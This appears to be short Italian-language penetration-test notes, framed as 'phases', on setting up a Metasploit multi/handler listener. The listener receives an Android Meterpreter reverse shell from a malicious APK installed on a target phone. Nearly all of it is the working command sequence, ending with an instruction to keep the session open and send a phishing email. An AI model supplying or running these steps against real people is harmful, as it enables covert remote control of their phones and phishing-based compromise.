# FASE 1 Aprire msfconsole

La sessione di Metasploit Framework funge da centro di comando unificato per gestire, orchestrare e tracciare le fasi operative del penetration test

Entriamo nella gestione del Listener
*msfconsole*
*use exploit/multi/handler*

# FASE 2 configurazione dell' Handler 

In questa fase attendiamo la connessione inversa generata dall'avvio dell'APK malevolo installato nel dispositivo android
*set PAYLOAD android/meterpreter/reverse_tcp*
*set LHOST 192.168.1.9*
(Deve corrispondere al payload)
*set LPORT 4447*
*set ExitOnSession false*      
(Mantiene il listener attivo anche se si connette)
*exploit -j* 

### verificare con *jobs -l* che il job sia attivo

### ATTENZIONE non si chiuda nessuna sessione ! Seguire con la mail di phishing